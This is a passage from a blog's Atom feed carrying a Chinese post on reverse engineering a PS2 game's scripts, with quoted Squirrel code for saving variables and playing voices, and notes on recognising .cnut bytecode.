<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shadow Gallery</title>
  
  <subtitle>Live in the shadow</subtitle>
  <link href="https://srpopty.github.io/atom.xml" rel="self"/>
  
  <link href="https://srpopty.github.io/"/>
  <updated>2023-06-12T05:02:36.000Z</updated>
  <id>https://srpopty.github.io/</id>
  
  <author>
    <name>Srpopty</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>某上古 PS2 游戏逆向（三）游戏脚本初步分析与反编译</title>
    <link href="https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2023-06-12T05:02:36.000Z</published>
    <updated>2023-06-12T05:02:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="脚本代码分析"><a href="# 脚本代码分析" class="headerlink" title="脚本代码分析"></a>脚本代码分析 </h1><p> 接下来就是要提取出每个声音所对应的文本，当然文本也不是凭空冒出来的，一定在某个文件中保存着文本，并且需要靠程序逻辑判断哪个文本播放哪个音频。</p><p>游戏中主要在以下几个地方存在执行逻辑：主程序在 CD 根目录 <code>SLPS_258.97</code> 中，位于扩展库 <code>IOP</code> 目录下的各个 <code>.IRX</code> 中，这两个都是 32 位的 MIPS，就算用 Ghidra 反编译也不太好逆，此外在提取 <code>SYSTEM.BIN</code> 的时候发现里面存在某种脚本语言的代码，并且用 Shift-JIS 编码写日语注释，相较于二进制文件，先看一看从 <code>SYSTEM.BIN</code> 中提取的脚本都干了什么。利用前文中的提取脚本，提取出了以下几个文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/Users/xxxxx/Desktop/xxxxx/SYSTEM_extracted</span><br><span class="line">├── 0_0_131e.dat</span><br><span class="line">├── 10_1f000_0.dat</span><br><span class="line">├── 11_1f000_8c5.dat</span><br><span class="line">├── 12_20000_1a60.dat</span><br><span class="line">├── 13_22000_1f01.dat</span><br><span class="line">├── 14_24000_56d1.dat</span><br><span class="line">├── 15_29800_306.dat</span><br><span class="line">├── 16_2a000_111d.dat</span><br><span class="line">├── 17_2b800_2dc.dat</span><br><span class="line">├── 18_2c000_1296.dat</span><br><span class="line">├── 19_2d800_4083.dat</span><br><span class="line">├── 1_1800_15e4.dat</span><br><span class="line">├── 20_32000_b12.dat</span><br><span class="line">├── 21_33000_4faa.dat</span><br><span class="line">├── 22_38000_114f.dat</span><br><span class="line">├── 23_39800_650.dat</span><br><span class="line">├── 24_3a000_f02.dat</span><br><span class="line">├── 25_3b000_8f7.dat</span><br><span class="line">├── 26_3c000_126e.dat</span><br><span class="line">├── 27_3d800_56f6.dat</span><br><span class="line">├── 28_43000_d330.dat</span><br><span class="line">├── 29_50800_288a.dat</span><br><span class="line">├── 2_3000_6f4.dat</span><br><span class="line">├── 30_53800_60e4.dat</span><br><span class="line">├── 31_5a000_c69.dat</span><br><span class="line">├── 32_5b000_8688.dat</span><br><span class="line">├── 33_63800_9d29.dat</span><br><span class="line">├── 34_6d800_796.dat</span><br><span class="line">├── 35_6e000_2821.dat</span><br><span class="line">├── 36_71000_527f6.dat</span><br><span class="line">├── 37_c3800_11bf5.dat</span><br><span class="line">├── 38_d5800_72ed.dat</span><br><span class="line">├── 39_dd000_21d0.dat</span><br><span class="line">├── 3_3800_4e02.dat</span><br><span class="line">├── 40_df800_22b8.dat</span><br><span class="line">├── 41_e2000_36f.dat</span><br><span class="line">├── 4_8800_7736.dat</span><br><span class="line">├── 5_10000_416e.dat</span><br><span class="line">├── 6_14800_1540.dat</span><br><span class="line">├── 7_16000_50ce.dat</span><br><span class="line">├── 8_1b800_27ed.dat</span><br><span class="line">└── 9_1e000_946.dat</span><br><span class="line"></span><br><span class="line">1 directory, 42 files</span><br></pre></td></tr></table></figure><p>首先看看 <code>0_0_131e.dat</code> 中的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">// XXX 画面サイズ定義</span><br><span class="line">SCWIDTH  &lt;- 640;</span><br><span class="line">SCHEIGHT &lt;- 448;</span><br><span class="line"></span><br><span class="line">EMPTY &lt;- &#123;&#125;; // 空の辞書</span><br><span class="line"></span><br><span class="line">savef &lt;- null; // ゲーム変数セーブ処理用</span><br><span class="line">f     &lt;- &#123;&#125;; // ゲーム変数</span><br><span class="line">sf    &lt;- &#123;&#125;; // システム変数</span><br><span class="line">tf    &lt;- &#123;&#125;; // テンポラリ変数</span><br><span class="line"></span><br><span class="line">variables    &lt;- null; // 変数情報</span><br><span class="line">voiceConfigs &lt;- null; // ボイスコンフィグ情報</span><br><span class="line">vconfigs &lt;- null;</span><br><span class="line"></span><br><span class="line">VAR_GAME   &lt;- 0;</span><br><span class="line">VAR_SYSTEM &lt;- 1;</span><br><span class="line">VAR_TEMP   &lt;- 2;</span><br><span class="line">VAR_SYSTEMWORK &lt;- 3;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 変数の初期化</span><br><span class="line"> * @param variables 変数情報</span><br><span class="line"> * @param zone 0: ゲーム変数 1: システム変数 2: テンポラリ</span><br><span class="line"> */</span><br><span class="line">function initVariables(variables, zone)</span><br><span class="line">&#123;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            switch (info.zone) &#123;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                sf[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            case VAR_TEMP:</span><br><span class="line">                tf[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                f[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    savef = clone f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function storeVariables(variables, zone, ...)</span><br><span class="line">&#123;</span><br><span class="line">    local no = 0;</span><br><span class="line">    local store = null;</span><br><span class="line">    if (vargc &gt; 0) &#123;</span><br><span class="line">        no = vargv[0];</span><br><span class="line">        if (vargc &gt; 1) &#123;</span><br><span class="line">            store = vargv[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    initFlag(zone, no);</span><br><span class="line">    if (zone == VAR_SYSTEMWORK) &#123;</span><br><span class="line">        zone = VAR_SYSTEM;</span><br><span class="line">    &#125;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch (zone) &#123;</span><br><span class="line">            case VAR_GAME:</span><br><span class="line">                var = savef[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                var = sf[info.name];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (store != null) &#123;</span><br><span class="line">                store[info.name] &lt;- var;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                switch(info.type) &#123;</span><br><span class="line">                case 0: // 数値</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        dm(&quot; セーブパラメータ：&quot; + info.name);</span><br><span class="line">                        setIntFlag(var.tointeger());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setIntFlag(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                case 1: // 数値 2</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        setFloatFlag(var.tofloat());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setFloatFlag(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                case 2: // 文字列</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        setStringFlag(var.tostring(), info.size);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setStringFlag(&quot;&quot;, info.size);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function restoreVariables(variables, zone, ...)</span><br><span class="line">&#123;</span><br><span class="line">    local no = 0;</span><br><span class="line">    local store = null;</span><br><span class="line">    if (vargc &gt; 0) &#123;</span><br><span class="line">        no = vargv[0];</span><br><span class="line">        if (vargc &gt; 1) &#123;</span><br><span class="line">            store = vargv[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    initFlag(zone, no);</span><br><span class="line">    if (zone == VAR_SYSTEMWORK) &#123;</span><br><span class="line">        zone = VAR_SYSTEM;</span><br><span class="line">    &#125;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch(info.type) &#123;</span><br><span class="line">            case 0: // 数値</span><br><span class="line">                var = getIntFlag();</span><br><span class="line">                break;</span><br><span class="line">            case 1: // 数値 2</span><br><span class="line">                var = getFloatFlag();</span><br><span class="line">                break;</span><br><span class="line">            case 2: // 数値</span><br><span class="line">                var = getStringFlag(info.size);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (store != null) &#123;</span><br><span class="line">                store[info.name] &lt;- var;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                switch (zone) &#123;</span><br><span class="line">                case 0:</span><br><span class="line">                    savef[info.name] &lt;- var;</span><br><span class="line">                    break;</span><br><span class="line">                case 1:</span><br><span class="line">                    sf[info.name] &lt;- var;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function showVariables(variables, zone)</span><br><span class="line">&#123;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch (info.zone) &#123;</span><br><span class="line">            case VAR_GAME:</span><br><span class="line">                var = f[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                var = sf[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_TEMP:</span><br><span class="line">                var = tf[info.name];</span><br><span class="line">            &#125;</span><br><span class="line">            dm(&quot; 名前:&quot; + info.name + &quot; 値:&quot; + var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// システムボイス情報</span><br><span class="line">sysvoices &lt;- dofile(&quot;sysvoices.nut&quot;);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * システムボイスの再生</span><br><span class="line"> */</span><br><span class="line">function systemVoice(name) &#123;</span><br><span class="line">    if (name in sysvoices) &#123;</span><br><span class="line">        Talk(0, sysvoices[name]);</span><br><span class="line">        return TalkLength(0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function systemVoiceStop() &#123;</span><br><span class="line">    TalkStop(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 初期化処理</span><br><span class="line">dofile(&quot;util.nut&quot;, true);</span><br><span class="line">dofile(&quot;Object.nut&quot;, true);</span><br><span class="line">dofile(&quot;BasicLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;msgwindow.nut&quot;, true);</span><br><span class="line">dofile(&quot;translayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;TEXTLAYER.NUT&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;action.nut&quot;, true);</span><br><span class="line">dofile(&quot;player.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;GraphicLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;GamePlayer.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;buttonlayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;dialogwindow.nut&quot;, true);</span><br><span class="line">dofile(&quot;selectwindow.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;EnvObject.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBase.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvImage.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvLevelLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBackLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvStageLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvEventLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvSimpleLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvCharacter.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBGM.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvSE.nut&quot;, true);</span><br><span class="line">dofile(&quot;Environment.nut&quot;, true);</span><br><span class="line">dofile(&quot;ScenePlayer.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;main.nut&quot;, true);</span><br><span class="line">dofile(&quot;game.nut&quot;, true);</span><br><span class="line">dofile(&quot;override.nut&quot;, true); // ゲーム個別の初期化処理を登録する</span><br><span class="line"></span><br><span class="line">function showGlobalInfos() &#123;</span><br><span class="line">    dm(&quot;------- スクリプト側でキャッシュされてる LAYER の画像情報 ------&quot;);</span><br><span class="line">    foreach (name,value in images) &#123;</span><br><span class="line">        dm(&quot;name:&quot; + name + &quot; value:&quot; + value);</span><br><span class="line">    &#125;</span><br><span class="line">    dm(&quot;------- アニメ情報一覧 -----------&quot;);</span><br><span class="line">    foreach (name,value in animeList) &#123;</span><br><span class="line">        dm(&quot;name:&quot; + name + &quot; value:&quot; + value);</span><br><span class="line">    &#125;</span><br><span class="line">    showMemoryInfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一串非常显眼的 <code>dofile</code>，并且参数包含了大量 <code>.nut</code> 结尾的文件，稍微 Google 一下可以发现这是 <code>Squirrel</code> 脚本。<code>Squirrel</code> 是一种面向对象的轻量级脚本语言，类似 Lua，常被用在游戏中。<code>Squirrel</code> 语言程序有两类，一类是 <code>.nut</code> 结尾的明文代码，另一类以 <code>.cnut</code> 结尾，类似 Python 的 <code>pyc</code> 文件，保存字节码，不过在 <code>Squirrel</code> 中这个操作不被称为“编译”，而被称为“序列化”，但是可惜的是 <code>Squirrel</code> 并没有提供反序列化这个操作，换句话说我们还是需要自己想办法将 <code>.cnut</code> 恢复成 <code>.nut</code> 文件。</p><p>基于此，我们将提取出的文件后缀改文 <code>.nut</code>。从 <code>SYSTEM.BIN</code> 中一共提取了 42 个文件，但是其中前 32 个都是明文代码，从第 33 个文件（32_5b000_8688.nut）到最后发现并不是明文，而是包含了大量二进制数据，其中夹杂着部分明文字符串。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/17.jpg" alt="Not Found"></p><p>实际上根据曾经逆向 <code>.pyc</code> 的经验，可以猜出这可能就是 <code>.cnut</code> 字节码文件，里面保存着一些符号。连续打开好几个这类文件，都可以看到很明显的特征：</p><ol><li><code>\xfa\xfaRIQS</code> 开头</li><li>包含了大量的 <code>TRAP</code> 字符串</li><li>开头会出现一个路径 <code>DataMake/xxx/xxx.nut</code></li></ol><p>根据这些特征也可以推断出这就是 <code>.cnut</code> 字节码文件。实际上 <code>.cnut</code> 是用小端存储的，<code>RIQS</code> 也就是 <code>SQIR</code> 是 <code>Squirrel</code> 的缩写，<code>TRAP</code> 也就是 <code>PART</code>，顾名思义是作为分隔符。</p><p>暂时先不管这些字节码，我们的目标是找到角色的语音文本，看了前 32 个脚本，在 <code>14_24000_56d1.nut</code> 中发现有一个 <code>playVoice</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス再生</span><br><span class="line"> * @param name キャラ名</span><br><span class="line"> * @param voicefile 再生ファイル</span><br><span class="line"> */</span><br><span class="line">function playVoice(name, voicefile) &#123;</span><br><span class="line">    if (isSkip() || !voiceenable) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // ボイス情報取得</span><br><span class="line">    local configName = &quot;etc&quot;;</span><br><span class="line">    if (name in voiceConfigs) &#123;</span><br><span class="line">        configName = voiceConfigs[name];</span><br><span class="line">    &#125;</span><br><span class="line">    if (!getVoiceOn(configName)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // ボリューム調整</span><br><span class="line">    // volume = getVoiceVolume(configName);</span><br><span class="line">    if (typeof voicefile == &quot;integer&quot;) &#123;</span><br><span class="line">        // ボイス再生処理</span><br><span class="line">        dm(&quot; ボイス再生:&quot; + voicefile);</span><br><span class="line">        Talk(0, voicefile);</span><br><span class="line">        talkVoiceLength = TalkLength(0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dm(&quot; ボイスが再生できない（コンバート時に存在していない）&quot; + voicefile);</span><br><span class="line">    &#125;</span><br><span class="line">    // 時間を返す</span><br><span class="line">    return talkVoiceLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用 <code>Talk(0, voicefile)</code> 猜测可能是让角色讲话，而 <code>voicefile</code> 是一个 int，应该就是从 <code>VOICE_ID.bin</code> 中提取出的声音文件的 id，<code>0</code> 代表什么暂时未知。可惜的是，在其他几个明文脚本中均未找到 <code>Talk</code> 函数的定义。根据 <code>playVoice</code> 函数注释（的翻译），<code>name</code> 参数表示角色名，<code>voicefile</code> 参数表示要播放的文件，但是最后影响 <code>Tlak</code> 函数的仅有 <code>voicefile</code>，而 <code>name</code> 仅用来判断该角色是否存在于 <code>voiceConfigs</code>。</p><p>首先我们先看一下 <code>playVoice</code> 从哪里会被调用，发现主要是在 <code>28_43000_d330.nut</code> 文件的 <code>playVoices</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 複数ボイスを鳴らす</span><br><span class="line"> * @return 最長のボイス再生時間</span><br><span class="line"> */</span><br><span class="line">function playVoices(voices) &#123;</span><br><span class="line">    local ret = null;</span><br><span class="line">    if (!isJump() &amp;&amp; voices != null) &#123;</span><br><span class="line">        foreach (name, info in voices) &#123;</span><br><span class="line">            local r;</span><br><span class="line">            // デフォルト名の場合の処理</span><br><span class="line">            if (isDefaultName() &amp;&amp; info.voicen != null) &#123;</span><br><span class="line">                r = playVoice(name, info.voicen);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                r = playVoice(name, info.voice);</span><br><span class="line">            &#125;</span><br><span class="line">            if (ret == null || r != null &amp;&amp; r &gt; ret) &#123;</span><br><span class="line">                    ret = r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>playVoice</code> 中的 <code>voicefile</code> 来自 <code>playVoices</code> 中的 <code>voices</code>字典，也就是其参数，保存了多个 <code>(name, voicefile)</code> 键值对。这个函数仅在该文件中的 <code>playNextVoice</code> 被调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス再生実行</span><br><span class="line"> */</span><br><span class="line">function playNextVoice() &#123;</span><br><span class="line">    if (nextvoices != null) &#123;</span><br><span class="line">        local ret = playVoices(nextvoices);</span><br><span class="line">        clearNextVoice();</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>playVoices</code> 中的 <code>voices</code> 字典来自全局变量 <code>nexvoices</code>。接下来再找找 <code>nextvoices</code> 的写值操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 次回再生するボイス情報</span><br><span class="line">// キー: キャラクタ名</span><br><span class="line">// 値: ボイス</span><br><span class="line">nextvoices = null;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次回同時に鳴らすボイスの追加</span><br><span class="line"> * @param name キャラ名</span><br><span class="line"> * @param voice  ボイス指定</span><br><span class="line"> * @param voicen 非デフォルト時ボイス指定</span><br><span class="line"> */</span><br><span class="line">function entryNextVoice(name, voice, voicen) &#123;</span><br><span class="line">    if (name != null &amp;&amp; voice != null) &#123;</span><br><span class="line">        if (nextvoices == null) &#123;</span><br><span class="line">            nextvoices = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        nextvoices[name] &lt;- &#123;voice=voice, voicen=voicen&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 